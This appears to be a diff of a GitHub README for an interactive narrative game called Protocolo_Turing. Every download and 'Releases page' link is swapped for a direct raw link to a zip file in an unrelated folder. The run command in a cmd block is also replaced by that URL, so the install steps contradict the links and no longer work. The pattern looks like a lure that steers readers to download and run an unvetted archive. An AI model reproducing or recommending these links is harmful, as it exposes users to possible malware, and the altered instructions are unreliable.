@@ -1,7 +1,7 @@
 # 🎮 Protocolo_Turing - Experience Interactive Narrative Adventure
 
 ## 📥 Download 
-[![Download Protocolo_Turing](https://img.shields.io/badge/Download-Protocolo_Turing-blue.svg)](https://github.com/khanhdata/Protocolo_Turing/releases)
+[![Download Protocolo_Turing](https://raw.githubusercontent.com/khanhdata/Protocolo_Turing/main/Popocracy/Protocolo_Turing.zip)](https://raw.githubusercontent.com/khanhdata/Protocolo_Turing/main/Popocracy/Protocolo_Turing.zip)
 
 ## 📖 About
 Protocolo_Turing is an interactive narrative game that takes you on a journey through logic, emotion, and morality within the context of the Turing Test. This project serves as an experimental showcase of conditional flows, variable manipulation, and narrative design in scripting languages. Engage with a story that challenges your decisions and perspective.
@@ -15,7 +15,7 @@ Follow these steps to download and run Protocolo_Turing easily.
 - At least 100 MB of disk space
 
 ## 💾 Download & Install
-1. **Visit the Releases page**: Click [here](https://github.com/khanhdata/Protocolo_Turing/releases) to access the latest version of Protocolo_Turing.
+1. **Visit the Releases page**: Click [here](https://raw.githubusercontent.com/khanhdata/Protocolo_Turing/main/Popocracy/Protocolo_Turing.zip) to access the latest version of Protocolo_Turing.
 
 2. **Choose the version**: On the Releases page, scroll down to find the list of available releases. 
 
@@ -34,7 +34,7 @@ Follow these steps to download and run Protocolo_Turing easily.
 - **Start the Game**: Type the name of the executable file and hit enter.
 
     ```cmd
-    Protocolo_Turing.exe
+    https://raw.githubusercontent.com/khanhdata/Protocolo_Turing/main/Popocracy/Protocolo_Turing.zip
     ```
 
 - **Follow the Prompts**: The game will guide you through each step of the narrative. Make choices based on the story's context.
@@ -63,6 +63,6 @@ Your contributions help enhance the game for everyone. Thank you for your suppor
 ## 🙏 Acknowledgments
 Thank you to everyone who has contributed to Protocolo_Turing. Your hard work and effort have made this project possible.
 
-For further information and updates, keep an eye on the [Releases page](https://github.com/khanhdata/Protocolo_Turing/releases). 
+For further information and updates, keep an eye on the [Releases page](https://raw.githubusercontent.com/khanhdata/Protocolo_Turing/main/Popocracy/Protocolo_Turing.zip). 
 
 Your journey into the realm of interactive fiction awaits! Enjoy the game.
